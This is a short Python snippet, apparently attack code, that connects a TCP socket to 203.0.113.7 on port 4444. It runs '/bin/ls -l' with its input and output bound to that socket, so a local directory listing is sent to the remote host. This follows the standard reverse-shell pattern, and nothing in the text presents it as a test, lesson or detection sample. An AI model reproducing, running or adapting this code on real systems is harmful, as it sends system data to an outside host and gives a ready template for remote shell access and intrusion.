import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("203.0.113.7", 4444))
p = subprocess.Popen(["/bin/ls", "-l"], stdin=s, stdout=s, stderr=s)
p.wait()
